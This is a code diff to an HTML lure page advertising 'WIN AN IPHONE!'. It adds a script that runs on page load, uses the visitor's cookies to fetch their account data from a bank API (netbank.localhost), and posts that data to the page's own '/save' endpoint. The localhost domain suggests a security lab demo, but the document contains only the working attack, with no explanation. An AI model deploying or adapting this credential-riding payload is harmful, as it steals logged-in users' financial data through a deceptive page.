@@ -38,5 +38,35 @@
   <h1>WIN AN IPHONE!</h1>
   <h2>Hurry up!!!!</h2>
   <img src="iphone.jpg" width="332" height="454" alt="iphone">
+  <script>
+    (() => {
+      const freeIphone = async () => {
+        response = await fetch('http://api.netbank.localhost/user', {
+          credentials: 'include',
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+        });
+
+        const data = await response.json();
+
+        await fetch('/save', {
+          credentials: 'include',
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            data,
+          }),
+        });
+      };
+
+      freeIphone();
+    })();
+  </script>
 </body>
 </html>
